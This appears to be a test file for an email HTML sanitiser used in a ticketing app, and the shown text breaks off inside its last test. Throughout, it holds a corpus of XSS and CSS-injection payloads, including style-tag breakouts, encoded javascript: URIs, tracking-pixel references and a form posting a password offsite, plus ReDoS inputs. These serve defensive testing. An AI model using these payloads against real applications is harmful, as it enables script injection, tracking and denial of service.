// EMAIL-TICKET.5 — the sanitiser's output string, asserted against a corpus.
//
// WHY THESE TESTS ASSERT ON THE OUTPUT STRING AND NOT ON A DOM
// The output of this module is handed to a browser as an iframe `srcdoc`. What
// matters is therefore what is IN THAT STRING — "no `onerror=` anywhere", "no
// `javascript:` anywhere" — not what some parser would have made of it. A test
// that re-parsed the output could agree with a parser that disagrees with the
// browser the operator is using; a substring assertion cannot.
//
// The corpus below is the standard evasion set: raw script bodies, event
// handlers on tags that are and are not allowed, the three executable URI
// schemes in every attribute that takes a URL, CSS that executes or phones
// home, and mixed-case/entity-encoded spellings of the lot.

import { describe, it, expect, vi } from 'vitest'
import { readFileSync, readdirSync } from 'node:fs'
import path from 'node:path'

// The one input the real parser cannot be made to reject on demand is "the
// parser itself blew up" — so it is injected. Everything else runs through
// the genuine sanitize-html.
const EXPLODE = '__SANITISER_EXPLODES__'
vi.mock('sanitize-html', async (importOriginal) => {
  const actual = await importOriginal()
  const real = actual.default || actual
  const wrapped = (html, options) => {
    if (typeof html === 'string' && html.includes(EXPLODE)) throw new Error('parser blew up')
    return real(html, options)
  }
  wrapped.defaults = real.defaults
  return { default: wrapped }
})

import {
  sanitizeEmailHtml,
  emailHtmlDocument,
  emailFrameDocument,
  unblockImages,
  isRemoteImageUrl,
  IFRAME_SANDBOX,
  ORIGINAL_SRC_ATTR,
  UNBLOCK_IMAGES_FROM,
  UNBLOCK_IMAGES_TO,
  BLOCKED_CSS_URL_PREFIX,
} from './email-html'

const clean = (html) => sanitizeEmailHtml(html).html

/** Nothing in the corpus may leave any of these anywhere in the output. */
function expectNothingExecutable(out) {
  const lower = out.toLowerCase()
  expect(lower).not.toContain('<script')
  expect(lower).not.toContain('javascript:')
  expect(lower).not.toContain('vbscript:')
  expect(lower).not.toContain('data:text/html')
  expect(lower).not.toMatch(/\son[a-z]+\s*=/)
}

describe('sanitizeEmailHtml — executable content', () => {
  it('drops a <script> tag AND its body', () => {
    const out = clean('<p>Hi</p><script>alert("xss")</script><p>Bye</p>')
    expect(out).toContain('<p>Hi</p>')
    expect(out).toContain('<p>Bye</p>')
    // The body must not survive as text either — re-rendered as text it is
    // inert, but it would be visible nonsense and one parser bug from live.
    expect(out).not.toContain('alert')
    expectNothingExecutable(out)
  })

  it('drops <img onerror>', () => {
    const out = clean('<img src="x" onerror="alert(1)">')
    expect(out).not.toContain('onerror')
    expect(out).not.toContain('alert')
    expectNothingExecutable(out)
  })

  it('drops <svg onload> and everything inside the svg', () => {
    const out = clean('<svg onload="alert(1)"><script>alert(2)</script>text</svg>')
    expect(out).not.toContain('svg')
    expect(out).not.toContain('alert')
    expectNothingExecutable(out)
  })

  it('drops <body onload>', () => {
    const out = clean('<html><body onload="alert(1)"><p>Body text</p></body></html>')
    expect(out).toContain('<p>Body text</p>')
    expect(out).not.toContain('onload')
    expectNothingExecutable(out)
  })

  it('drops <iframe>, <object>, <embed> and their contents', () => {
    const out = clean(
      '<iframe src="https://evil.example/x"></iframe>'
      + '<object data="https://evil.example/x.swf">fallback</object>'
      + '<embed src="https://evil.example/x.swf">'
      + '<p>Real content</p>',
    )
    expect(out).toBe('<p>Real content</p>')
  })

  it('drops a <form> posting offsite, its inputs and its action', () => {
    const out = clean(
      '<form action="https://evil.example/steal" method="post">'
      + '<input name="password" type="password">'
      + '<input type="submit" value="Go">'
      + '</form>',
    )
    expect(out).not.toContain('<form')
    expect(out).not.toContain('<input')
    expect(out).not.toContain('evil.example')
    expect(out).not.toContain('action')
  })

  it('drops <link> (a stylesheet is a remote fetch and a CSS injection)', () => {
    const out = clean('<link rel="stylesheet" href="https://evil.example/x.css"><p>Hi</p>')
    expect(out).toBe('<p>Hi</p>')
  })
})

describe('sanitizeEmailHtml — executable URI schemes', () => {
  it('strips javascript: from href', () => {
    const out = clean('<a href="javascript:alert(1)">Click</a>')
    expect(out).not.toContain('javascript')
    // The link text survives — only the destination is refused.
    expect(out).toContain('Click')
    expectNothingExecutable(out)
  })

  it('strips mixed-case and entity-encoded javascript: (jAvAsCrIpT&#58;)', () => {
    const out = clean('<a href="jAvAsCrIpT&#58;alert(1)">Click</a>')
    expect(out.toLowerCase()).not.toContain('javascript')
    expect(out).not.toContain('alert')
    expectNothingExecutable(out)
  })

  it('strips javascript: split by a tab or newline inside the scheme', () => {
    const out = clean('<a href="java\tscript:alert(1)">One</a><a href="java\nscript:alert(1)">Two</a>')
    expect(out).not.toContain('alert')
    expectNothingExecutable(out)
  })

  it('strips vbscript: from href', () => {
    const out = clean('<a href="vbscript:msgbox(1)">Click</a>')
    expect(out.toLowerCase()).not.toContain('vbscript')
    expectNothingExecutable(out)
  })

  it('strips data:text/html from href and from img src', () => {
    const out = clean(
      '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">D</a>'
      + '<img src="data:text/html,<script>alert(1)</script>">',
    )
    expect(out).not.toContain('data:')
    expect(out).not.toContain('base64')
    expectNothingExecutable(out)
  })

  it('drops srcset entirely, data: URIs included', () => {
    const out = clean(
      '<img srcset="data:text/html,<script>alert(1)</script> 1x, https://cdn.example/a.png 2x"'
      + ' src="https://cdn.example/a.png">',
    )
    expect(out).not.toContain('srcset')
    expect(out).not.toContain('data:')
    expectNothingExecutable(out)
  })

  it('refuses a protocol-relative URL rather than inheriting a scheme', () => {
    const out = clean('<a href="//evil.example/x">Click</a>')
    expect(out).not.toContain('evil.example')
  })

  it('keeps ordinary http, https, mailto and tel links', () => {
    const out = clean(
      '<a href="https://un1tdublin.com/x">A</a>'
      + '<a href="http://un1tdublin.com/y">B</a>'
      + '<a href="mailto:studio@un1tdublin.com">C</a>'
      + '<a href="tel:+35312345678">D</a>',
    )
    expect(out).toContain('href="https://un1tdublin.com/x"')
    expect(out).toContain('href="http://un1tdublin.com/y"')
    expect(out).toContain('href="mailto:studio@un1tdublin.com"')
    expect(out).toContain('href="tel:+35312345678"')
  })
})

describe('sanitizeEmailHtml — CSS', () => {
  // The <style> block SURVIVES — stripping it is what turns real email into a
  // column of naked text (Richard, 2026-08-07). What comes out of it is the
  // executable and the networked.
  it('keeps a <style> block but strips expression() and @import from it', () => {
    const out = clean(
      '<style>@import url("https://evil.example/x.css");'
      + '.headline{color:#111;font-size:24px}'
      + '.hack{width:expression(alert(1))}</style><p>Hi</p>',
    )
    expect(out).toContain('<style>')
    expect(out).toContain('.headline{color:#111;font-size:24px}')
    expect(out).not.toContain('@import')
    expect(out).not.toContain('expression')
    expect(out).not.toContain('evil.example')
  })

  it('keeps a <style> block that lives in the <head>, where real email puts it', () => {
    const out = clean(
      '<html><head><title>Newsletter</title>'
      + '<style>@media only screen and (max-width:600px){.col{width:100%!important}}</style>'
      + '</head><body><p>Hi</p></body></html>',
    )
    expect(out).toContain('@media only screen and (max-width:600px)')
    expect(out).toContain('<p>Hi</p>')
    expect(out).not.toContain('Newsletter')
  })

  // ── The <style> body escape (found by adversarial review, 2026-08-07) ──
  //
  // sanitize-html emits <style> bodies VERBATIM, and scrubCss() then DELETES
  // characters from that verbatim text before it is re-wrapped in a literal
  // `<style>…</style>`. Every deletion is therefore a weapon: one sitting
  // between a `<` and a `/style>` reconstitutes a real closing tag, and
  // everything after it lands in the frame as live, unsanitised HTML.
  //
  // Verified in the real frame before the fix: a tracking pixel fired with
  // blockedImages = 0 (so the operator saw no Show-images button and no
  // warning at all), an injected <link rel=stylesheet> was fetched, and an
  // injected <iframe> rendered an attacker's page inside the ticket pane.
  //
  // Each test below names the deletion primitive it abuses. They pass now
  // because scrubCss() strips `<` and `>` after every deletion.
  describe('the <style> body cannot reconstitute its own closing tag', () => {
    const ESCAPES = [
      ['backslash strip', '<\\/style>'],
      ['comment strip', '</*x*//style>'],
      ['@import strip', '<@import q;/style>'],
      ['backslash strip, spaced', '<\\ /style >'],
      ['backslash strip, upper case', '<\\/STYLE>'],
      ['backslash strip, mixed case', '<\\/StYlE>'],
      ['comment strip, multiline', '</*\n\n*//style>'],
    ]

    for (const [primitive, close] of ESCAPES) {
      it(`survives the ${primitive} (${JSON.stringify(close)})`, () => {
        const payload = `<style>.a{}${close}`
          + '<img src="https://tracker.example/pixel.gif">'
          + '<link rel="stylesheet" href="https://evil.example/x.css">'
          + '<iframe src="https://evil.example/"></iframe>'
          + '<a href="https://evil.example/">Click</a>'
        const { html, blockedImages } = sanitizeEmailHtml(payload)

        // ONE closing tag: the one this module wrote.
        expect(html.match(/<\/style>/gi) || []).toHaveLength(1)
        // Nothing was smuggled past the sanitiser: the payload stays CSS text
        // inside the style element instead of becoming live markup.
        expect(html).not.toContain('<link')
        expect(html).not.toContain('<iframe')
        expect(html).not.toContain('<img')
        expect(html).not.toContain('<a ')
        // And nothing in it is fetchable — every remote reference left in the
        // CSS is parked, which is also what restores the operator's warning
        // (blockedImages was 0 while the pixel was firing).
        expect(html).not.toMatch(/(?<!x-un1t-blocked:)https?:\/\//)
        expect(blockedImages).toBeGreaterThan(0)
      })
    }

    it('leaves no angle bracket at all inside a scrubbed <style> body', () => {
      // The invariant the fix rests on, asserted directly: no ordering of
      // deletions — present or future — can build a tag out of a body that
      // contains neither character.
      const { html } = sanitizeEmailHtml(
        '<style>.a{content:"<>"}<\\/style>/*<*/@import "<";.b{}</style>',
      )
      const bodies = [...html.matchAll(/<style\b[^>]*>([\s\S]*?)<\/style>/gi)].map(m => m[1])
      expect(bodies.length).toBeGreaterThan(0)
      for (const body of bodies) {
        expect(body).not.toContain('<')
        expect(body).not.toContain('>')
      }
    })
  })

  it('cannot be escaped from — a </style> inside the CSS closes the element, it does not smuggle a tag', () => {
    // The classic breakout against anyone who allows <style>. The parser ends
    // the element at the first `</style`, so what follows is judged as markup
    // like anything else — and an <img onerror> is not markup we allow.
    const out = clean('<style>.x{content:"</style><img src=x onerror=alert(1)>"}</style><p>Hi</p>')
    expect(out).not.toContain('onerror')
    expect(out).not.toContain('alert')
    expect(out).toContain('<p>Hi</p>')
    expectNothingExecutable(out)
  })

  it('drops a style element that scrubbed down to nothing', () => {
    expect(clean('<style>@import url("https://evil.example/x.css");</style><p>Hi</p>')).toBe('<p>Hi</p>')
  })

  it('strips CSS escapes, which are the only way to hide a keyword from the filter', () => {
    // `u\72 l(` IS url( to a browser and is not url( to a regex, so backslashes
    // go before anything is matched. What is left — `u72 l(…)` — is an unknown
    // function in an invalid declaration: the CSS parser drops it and nothing
    // is fetched.
    const out = clean('<style>.x{background:u\\72 l(https://evil.example/pixel.png)}</style>')
    expect(out).not.toContain('\\')
    expect(out).not.toMatch(/url\(/i)
  })

  it('parks a remote CSS url() behind an unresolvable scheme instead of fetching it', () => {
    const { html, blockedImages } = sanitizeEmailHtml(
      '<p style="background-image: url(https://cdn.example/pixel.png); color: red">Hi</p>',
    )
    expect(html).toContain('color: red')
    expect(html).toContain(`url(${BLOCKED_CSS_URL_PREFIX}https://cdn.example/pixel.png)`)
    // Counted, so the message offers the same Show images action an <img> does.
    expect(blockedImages).toBe(1)
  })

  // ── image-set() and friends (found by adversarial review, 2026-08-07) ──
  //
  // CSS Images 4 lets image-set() take a BARE STRING — no url() anywhere — so
  // the url()-shaped parking never saw it. Verified fetching in the real
  // frame, with blockedImages = 0: a clean tracking pixel and no affordance
  // shown to the operator at all, the email looking like it had no remote
  // content. The fix does not enumerate functions; it parks every remote
  // reference left in the CSS, whatever function it sits in.
  describe('remote references outside url() are parked too', () => {
    const FORMS = [
      ['image-set in a <style> block', '<style>.k{background-image:image-set("https://t.example/x.gif" 1x)}</style><div class="k">.</div>'],
      ['image-set in a style attribute', `<div style="background-image:image-set('https://t.example/x.gif' 1x)">.</div>`],
      ['-webkit-image-set', '<style>.w{background:-webkit-image-set("https://t.example/x.gif" 1x)}</style><div class="w">.</div>'],
      ['cross-fade', '<style>.c{background:cross-fade(url(https://a.example/1.png), "https://t.example/x.gif", 50%)}</style>'],
      ['src() in a font-face', '<style>@font-face{font-family:x;src:src("https://t.example/f.woff2")}</style>'],
      ['a bare quoted protocol-relative URL', '<style>.p{background-image:image-set("//t.example/x.gif" 1x)}</style>'],
    ]

    for (const [name, source] of FORMS) {
      it(`parks and counts ${name}`, () => {
        const { html, blockedImages } = sanitizeEmailHtml(source)
        // Nothing resolvable is left…
        expect(html).not.toMatch(/(?<!x-un1t-blocked:)https?:\/\//)
        expect(html).not.toMatch(/(['"])\s*\/\//)
        // …and the operator is told, which is the half that was missing.
        expect(blockedImages).toBeGreaterThan(0)
      })
    }

    it('restores them all when the operator asks for images', () => {
      const { html } = sanitizeEmailHtml(
        '<style>.k{background-image:image-set("https://t.example/x.gif" 1x)}</style>',
      )
      expect(unblockImages(html)).toContain('image-set("https://t.example/x.gif" 1x)')
    })
  })

  it('neutralises an UNCLOSED url(, which a browser would still fetch', () => {
    // CSS error recovery closes open constructs at end of input, so this is a
    // live fetch in a browser and a no-match for the url() pattern.
    const out = clean('<style>.x{background:url(https://evil.example/pixel.png</style>')
    expect(out).not.toContain('url(')
    expect(out).toContain('none(')
  })

  it('drops a data: url() from CSS rather than parking it', () => {
    const out = clean('<p style="background: url(data:text/html,<script>alert(1)</script>)">Hi</p>')
    expect(out).not.toContain('data:')
    expectNothingExecutable(out)
  })

  it('drops executable declarations from an inline style attribute', () => {
    const out = clean(
      '<p style="color: red; width: expression(alert(1)); behavior: url(#default#time2)">Hi</p>',
    )
    expect(out).toContain('color: red')
    expect(out).not.toContain('expression')
    expect(out).not.toContain('behavior')
  })

  it('drops a style attribute that was nothing but dangerous declarations', () => {
    expect(clean('<p style="behavior: url(#default#time2)">Hi</p>')).toBe('<p>Hi</p>')
  })
})

// ── ReDoS (found by adversarial review, 2026-08-07) ──────────────────
//
// The old `[^;{}]*<keyword>[^;{}]*` declaration regex was quadratic on a run
// with no `;{}` in it: 9.1s at 100k, 36.8s at 200k, 82.6s at 300k of blocking
// CPU. HTML_BODY_MAX_CHARS is exactly 300,000, so an unauthenticated sender
// could make a ticket permanently unopenable with `<style>` + 299k of one
// letter. Everything here must finish in milliseconds.
describe('pathological CSS cannot burn CPU', () => {
  const BUDGET_MS = 1000

  function timed(fn) {
    const started = Date.now()
    fn()
    return Date.now() - started
  }

  it('scrubs 300k of delimiter-free CSS in well under a second', () => {
    // The reported payload: 82.6s of blocking CPU before the fix.
    const payload = `<style>${'a'.repeat(299_000)}</style>`
    expect(timed(() => sanitizeEmailHtml(payload))).toBeLessThan(BUDGET_MS)
  })

  it('SCRUBS (not merely caps) 99k of delimiter-free CSS in well under a second', () => {
    // Deliberately under CSS_CHUNK_MAX_CHARS so the linear scrubber actually
    // runs on it — otherwise this suite would only be proving the size cap,
    // and a quadratic scrubber could hide behind the cap forever. 9.1s at
    // 100k before the fix.
    const css = `.a{color:red}${'a'.repeat(98_000)}`
    expect(css.length).toBeLessThan(100_000)
    const payload = `<style>${css}</style>`
    expect(timed(() => sanitizeEmailHtml(payload))).toBeLessThan(BUDGET_MS)
    // …and the scrub really happened.
    expect(clean(payload)).toContain('.a{color:red}')
  })

  it('scrubs a 40k delimiter-free style attribute in well under a second', () => {
    const payload = `<p style="${'a'.repeat(40_000)}">Hi</p>`
    expect(timed(() => sanitizeEmailHtml(payload))).toBeLessThan(BUDGET_MS)
  })

  it('survives many unclosed url( openers, which used to backtrack', () => {
    // 78k — under the cap, so the url() patterns are genuinely exercised.
    const payload = `<style>${'a{background:url(https://x'.repeat(3_000)}</style>`
    expect(payload.length).toBeLessThan(100_000)
    const { html } = sanitizeEmailHtml(payload)
    expect(timed(() => sanitizeEmailHtml(payload))).toBeLessThan(BUDGET_MS)
    expect(html).not.toMatch(/(?<!x-un1t-blocked:)https?:\/\//)
  })

  it('survives a full 300k document of mixed pathological CSS', () => {
    const payload = `<style>${'a'.repeat(150_000)}</style>`
      + `<p style="${'b'.repeat(40_000)}">x</p>`
      + `<style>${'c'.repeat(100_000)}</style>`
    expect(timed(() => sanitizeEmailHtml(payload))).toBeLessThan(BUDGET_MS)
  })

  it('still drops the executable declarations it used to drop', () => {
    // The linear rewrite has to be equivalent, not merely fast.
    const out = clean('<style>.a{color:red;width:expression(alert(1))}.b{behavior:x}</style>')
    expect(out).toContain('color:red')
    expect(out).not.toContain('expression')
    expect(out).not.toContain('behavior')
  })

  it('drops CSS past the per-message budget rather than processing it', () => {
    // Belt and braces behind the linear scrub: a bound that exists cannot be
    // a denial of service, whatever a future edit does to the scrubber.
    const out = clean(`<style>${'a{color:red}'.repeat(20_000)}</style>`)
    expect(out).not.toContain('<style>')
  })
})

describe('sanitizeEmailHtml — links are rewritten', () => {
  it('keeps the inline style that makes a CTA look like a button', () => {
    const out = clean(
      '<a href="https://un1tdublin.com/join" style="background:#e11d48;color:#fff;'
      + 'padding:12px 24px;border-radius:4px;display:inline-block">Claim the offer</a>',
    )
    expect(out).toContain('background:#e11d48')
    expect(out).toContain('padding:12px 24px')
    expect(out).toContain('display:inline-block')
    expect(out).toContain('rel="noopener noreferrer nofollow"')
  })

  it('scrubs that style like any other', () => {
    const out = clean('<a href="https://x.example" style="color:red;background:url(https://t.example/p.png)">Go</a>')
    expect(out).toContain('color:red')
    expect(out).toContain(BLOCKED_CSS_URL_PREFIX)
  })

  it('adds target=_blank and rel=noopener noreferrer nofollow to every link', () => {
    const out = clean('<a href="https://example.com/a">One</a><a href="https://example.com/b">Two</a>')
    expect(out).toBe(
      '<a href="https://example.com/a" target="_blank" rel="noopener noreferrer nofollow">One</a>'
      + '<a href="https://example.com/b" target="_blank" rel="noopener noreferrer nofollow">Two</a>',
    )
  })

  it('overwrites a sender-supplied target and rel rather than merging them', () => {
    const out = clean('<a href="https://example.com/a" target="_top" rel="opener">One</a>')
    expect(out).toContain('target="_blank"')
    expect(out).toContain('rel="noopener noreferrer nofollow"')
    expect(out).not.toContain('_top')
    expect(out).not.toContain('rel="opener"')
  })
})

describe('sanitizeEmailHtml — remote images are blocked by default', () => {
  it('rewrites a remote <img src> to data-original-src, preserving the original', () => {
    const { html, blockedImages } = sanitizeEmailHtml(
      '<img src="https://cdn.example/tracker.gif?u=member%40example.com" width="1" height="1" alt="">',
    )
    expect(html).toContain(`${ORIGINAL_SRC_ATTR}="https://cdn.example/tracker.gif?u=member%40example.com"`)
    // The load-bearing half: no live src survives, so nothing is fetched and
    // no read is reported to a third party until an operator asks.
    expect(html).not.toMatch(/\ssrc=/)
    expect(blockedImages).toBe(1)
  })

  it('counts every blocked image', () => {
    const { blockedImages } = sanitizeEmailHtml(
      '<img src="https://a.example/1.png"><img src="https://b.example/2.png"><img src="/relative.png">',
    )
    expect(blockedImages).toBe(2)
  })

  it('discards a sender-supplied data-original-src instead of honouring it', () => {
    // Otherwise a sender could pre-park a javascript: URL in the attribute the
    // show-images swap promotes to src, skipping the validation entirely.
    const { html, blockedImages } = sanitizeEmailHtml(
      `<img ${ORIGINAL_SRC_ATTR}="javascript:alert(1)" src="https://cdn.example/real.png">`,
    )
    expect(html).toContain(`${ORIGINAL_SRC_ATTR}="https://cdn.example/real.png"`)
    expect(html).not.toContain('javascript')
    expect(blockedImages).toBe(1)
  })

  it('drops the src of a cid: inline attachment rather than leaving a dead fetch', () => {
    const { html, blockedImages } = sanitizeEmailHtml('<img src="cid:logo@example" alt="Logo">')
    expect(html).not.toContain('cid:')
    expect(blockedImages).toBe(0)
  })

  it('does not treat a <td background> URL as safe — it is a tracking pixel too', () => {
    const out = clean('<table><tr><td background="https://evil.example/pixel.png">Hi</td></tr></table>')
    expect(out).not.toContain('evil.example')
    expect(out).not.toContain('background')
  })
})

describe('isRemoteImageUrl', () => {
  it('accepts http and https only', () => {
    expect(isRemoteImageUrl('https://a.example/x.png')).toBe(true)
    expect(isRemoteImageUrl('HTTP://a.example/x.png')).toBe(true)
    expect(isRemoteImageUrl('  https://a.example/x.png')).toBe(true)
  })

  it('rejects everything that is not plainly remote', () => {
    for (const v of ['javascript:alert(1)', 'data:image/png;base64,AAA', 'cid:logo@x',
      '/relative.png', '//protocol.relative/x.png', 'https://', '', null, undefined]) {
      expect(isRemoteImageUrl(v)).toBe(false)
    }
  })
})

describe('unblockImages', () => {
  it('promotes every parked URL to a live src', () => {
    const { html } = sanitizeEmailHtml('<img src="https://cdn.example/a.png"><img src="https://cdn.example/b.png">')
    const shown = unblockImages(html)
    expect(shown).toContain('src="https://cdn.example/a.png"')
    expect(shown).toContain('src="https://cdn.example/b.png"')
    expect(shown).not.toContain(ORIGINAL_SRC_ATTR)
  })

  it('is a no-op on a document with nothing blocked', () => {
    const doc = emailFrameDocument('<p>Hi</p>')
    expect(unblockImages(doc)).toBe(doc)
  })
})

describe('emailHtmlDocument', () => {
  it('returns a complete srcdoc document with the sanitised body inside it', () => {
    const { document: doc, blockedImages, failed } = emailHtmlDocument('<p>Hello <b>there</b></p>')
    expect(doc.startsWith('<!doctype html>')).toBe(true)
    expect(doc).toContain('<p>Hello <b>there</b></p>')
    expect(doc).toContain('<meta name="referrer" content="no-referrer">')
    expect(blockedImages).toBe(0)
    expect(failed).toBe(false)
  })

  it('returns no document for empty, whitespace or non-string input', () => {
    for (const v of ['', '   ', null, undefined, 42, {}]) {
      expect(emailHtmlDocument(v)).toEqual({ document: null, blockedImages: 0, failed: false })
    }
  })

  it('returns no document when the body sanitises down to nothing', () => {
    // An HTML part that is only a tracker or only script has no readable
    // content — an empty frame would be worse than the text fallback.
    expect(emailHtmlDocument('<script>alert(1)</script>').document).toBeNull()
  })

  it('reports failure and returns NO html when the sanitiser throws', () => {
    // The fallback is the plain text plus a visible notice. There is no code
    // path anywhere that hands the raw input to the browser.
    const raw = `<p>${EXPLODE}</p><script>alert(1)</script>`
    const result = emailHtmlDocument(raw)
    expect(result).toEqual({ document: null, blockedImages: 0, failed: true })
    expect(JSON.stringify(result)).not.toContain(EXPLODE)
  })

  it('gives the frame a white canvas and does not clamp a fixed-width layout', () => {
    const doc = emailFrameDocument('<p>Hi</p>')
    // Email assumes white. On a transparent frame, light-grey-on-white body
    // copy disappears and dark-mode CSS renders white on white.
    expect(doc).toContain('background:#fff')
    expect(doc).toContain('color:#111')
    // A 600px marketing table must scroll inside the frame, not be squashed
    // into it — so no width clamp on tables.
    expect(doc).not.toContain('max-width:100%')
  })
})

// ── Fidelity ─────────────────────────────────────────────────────────
//
// THIS IS THE TEST THAT STOPS A FUTURE SECURITY TIGHTENING SILENTLY TURNING
// THE FEATURE BACK INTO PLAIN TEXT. The mail that actually arrives in this
// queue is forwarded marketing and other systems' receipts: table layout,
// inline styles, a <style> block, remote images. If any of that stops coming
// through, the feature has quietly failed at the only job it was added for,
// and nothing in the XSS corpus above would notice.
describe('fidelity — a real table-based marketing email', () => {
  const MARKETING = `
<html>
  <head>
    <title>UN1T January Newsletter</title>
    <style>
      .wrapper { background-color: #f4f4f4; padding: 24px 0; }
      .headline { font-family: Helvetica, Arial, sans-serif; font-size: 28px; color: #111111; }
      @media only screen and (max-width: 600px) { .col { width: 100% !important; } }
    </style>
  </head>
  <body>
    <table id="outer" role="presentation" class="wrapper" width="600" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" align="center">
      <tbody>
        <tr>
          <td class="col" align="center" valign="top" style="padding: 20px; background-color: #ffffff;">
            <img src="https://cdn.example/logo.png" alt="UN1T" width="180" height="40">
            <h1 class="headline" style="color: #111111; font-size: 28px;">Two weeks free</h1>
            <p style="font-family: Helvetica, Arial, sans-serif; font-size: 15px; line-height: 22px;">
              Start January with us. <a href="https://un1tdublin.com/join" style="color: #e11d48;">Claim the offer</a>.
            </p>
            <table width="100%"><tr><td width="50%">Stillorgan</td><td width="50%">Hatch Street</td></tr></table>
          </td>
        </tr>
      </tbody>
    </table>
  </body>
</html>`

  const { document: doc, blockedImages } = emailHtmlDocument(MARKETING)

  it('keeps the table structure the layout is built from', () => {
    expect(doc).toContain('<table id="outer" role="presentation" class="wrapper" width="600"')
    expect(doc).toContain('cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" align="center"')
    expect(doc).toContain('<tbody>')
    expect(doc).toContain('<td class="col" align="center" valign="top"')
    expect(doc).toContain('<td width="50%">Stillorgan</td>')
  })

  it('keeps the exact tag and attribute set the live production ticket uses', () => {
    // Taken from the forwarded marketing email sitting in the queue right now
    // (message fe66dde2, 30k of HTML, 23 tables, 12 images). Every tag and
    // attribute it contains must survive, or the one real message this feature
    // was built for renders as a column of text.
    const tags = ['a', 'br', 'div', 'h2', 'img', 'p', 'span', 'strong', 'table', 'tbody', 'td', 'tr', 'u']
    const attrs = ['align', 'alt', 'bgcolor', 'border', 'cellpadding', 'cellspacing', 'class',
      'dir', 'height', 'href', 'id', 'lang', 'rel', 'role', 'style', 'target', 'valign', 'width']
    const source = `<table id="t" role="presentation" class="c" dir="ltr" lang="en" bgcolor="#fff" `
      + `border="0" cellpadding="0" cellspacing="0" width="600" align="center" valign="top" style="margin:0">`
      + `<tbody><tr><td align="left" valign="middle" width="300" height="40" style="padding:4px">`
      + `<div><p><span><strong>Bold</strong> and <u>underlined</u></span><br>`
      + `<h2 style="color:#111">Heading</h2>`
      + `<a href="https://example.com" target="_self" rel="me">Link</a>`
      + `<img src="https://cdn.example/a.png" alt="A" width="10" height="10" align="left" border="0" style="display:block">`
      + `</p></div></td></tr></tbody></table>`
    const out = sanitizeEmailHtml(source).html
    for (const tag of tags) expect(out).toContain(`<${tag}`)
    // `src` is the deliberate exception: it is parked, not kept.
    for (const attr of attrs) expect(out).toContain(`${attr}=`)
    expect(out).toContain(`${ORIGINAL_SRC_ATTR}="https://cdn.example/a.png"`)
  })

  it('keeps the inline styles that carry the design', () => {
    expect(doc).toContain('padding: 20px')
    expect(doc).toContain('background-color: #ffffff')
    expect(doc).toContain('color: #111111')
    expect(doc).toContain('font-size: 15px')
    expect(doc).toContain('line-height: 22px')
  })

  it('keeps the <style> block, media query and all', () => {
    expect(doc).toContain('.wrapper { background-color: #f4f4f4; padding: 24px 0; }')
    expect(doc).toContain('.headline { font-family: Helvetica, Arial, sans-serif;')
    expect(doc).toContain('@media only screen and (max-width: 600px) { .col { width: 100% !important; } }')
  })

  it('keeps the copy, the links and the image slots', () => {
    expect(doc).toContain('Two weeks free')
    expect(doc).toContain('Start January with us.')
    expect(doc).toContain('href="https://un1tdublin.com/join"')
    expect(doc).toContain('alt="UN1T" width="180" height="40"')
    // Blocked, but present and restorable — a placeholder in the layout, not
    // a hole where the logo was.
    expect(doc).toContain(`${ORIGINAL_SRC_ATTR}="https://cdn.example/logo.png"`)
    expect(blockedImages).toBe(1)
  })

  it('still leaves nothing executable in it', () => {
    expectNothingExecutable(doc)
    expect(doc).not.toContain('UN1T January Newsletter')  // <title> is not body copy
  })

  it('renders every image once the operator asks for them', () => {
    const shown = unblockImages(doc)
    expect(shown).toContain('src="https://cdn.example/logo.png"')
    // No URL is left parked. (The frame's own `img[data-original-src]`
    // placeholder rule stays in the head — it simply stops matching.)
    expect(shown).not.toContain(UNBLOCK_IMAGES_FROM)
    expect(shown).not.toContain(BLOCKED_CSS_URL_PREFIX)
  })
})

// ── Layer 1 ──────────────────────────────────────────────────────────
//
// The sandbox attribute is the layer that holds when the sanitiser does not.
// Removing a token from it changes nothing visible, breaks no test that looks
// at content, and silently deletes the protection — so it gets its own
// assertion here AND an assertion against the component's source, because the
// value that matters is the one in the JSX the browser receives.
describe('iframe sandbox — Layer 1', () => {
  it('grants neither allow-scripts nor allow-same-origin', () => {
    expect(IFRAME_SANDBOX).not.toContain('allow-scripts')
    expect(IFRAME_SANDBOX).not.toContain('allow-same-origin')
  })

  it('grants nothing beyond opening a clicked link', () => {
    expect(IFRAME_SANDBOX.split(/\s+/).filter(Boolean).sort()).toEqual(
      ['allow-popups', 'allow-popups-to-escape-sandbox'],
    )
  })

  // Read as CODE, not as prose: the assertions below scan the sandbox
  // attributes and the import list, so a comment explaining the rule can never
  // be mistaken for a violation of it — nor a violation hidden in a comment.
  const component = readFileSync(
    path.join(process.cwd(), 'src/components/tickets/TicketThread.jsx'),
    'utf8',
  )
  const sandboxes = [...component.matchAll(/sandbox="([^"]*)"/g)].map(m => m[1])
  const imports = [...component.matchAll(/^import[^\n]*?from\s+'([^']+)'/gm)].map(m => m[1])

  it('the thread component renders exactly one frame, with exactly that sandbox', () => {
    expect(sandboxes).toEqual([IFRAME_SANDBOX])
  })

  it('no frame in the component grants allow-scripts or allow-same-origin', () => {
    // Stated separately from the equality above so that adding a second frame
    // later fails on the specific thing that matters, not on the count.
    for (const value of sandboxes) {
      expect(value).not.toContain('allow-scripts')
      expect(value).not.toContain('allow-same-origin')
    }
  })

  it('the thread component uses srcDoc, not the React raw-HTML escape hatch', () => {
    expect(component).toContain('srcDoc')
    expect(component).not.toContain(`dangerously${'SetInnerHTML'}`)
  })

  it('the thread component does the show-images swap exactly as specified', () => {
    // The swap is a rename of already-validated, already-escaped values. If it
    // ever becomes something cleverer — a parse, a regex over the whole
    // document — that is a change to the security model and this fails.
    expect(component).toContain(UNBLOCK_IMAGES_FROM)
    expect(component).toContain(UNBLOCK_IMAGES_TO)
    expect(component).toContain(BLOCKED_CSS_URL_PREFIX)
  })

  it('the thread component never pulls the sanitiser into the client bundle', () => {
    // sanitize-html drags postcss and htmlparser2 with it, and a sanitiser in
    // the browser proves nothing about what the server sent.
    expect(imports).not.toContain('@/lib/email-html')
    expect(imports).not.toContain('sanitize-html')
  })

  // The guarantee above, for the WHOLE repo rather than one file. This is what
  // `import 'server-only'` would do at build time; that import cannot land
  // until vitest.config.js resolves the package's react-server condition (see
  // the note at the top of email-html.js), so until then it is enforced here,
  // over every client component that exists rather than the one that happens
  // to render the frame today.
  it('no client component anywhere in src/ imports this module', () => {
    const offenders = []
    const walk = (dir) => {
      for (const entry of readdirSync(dir, { withFileTypes: true })) {
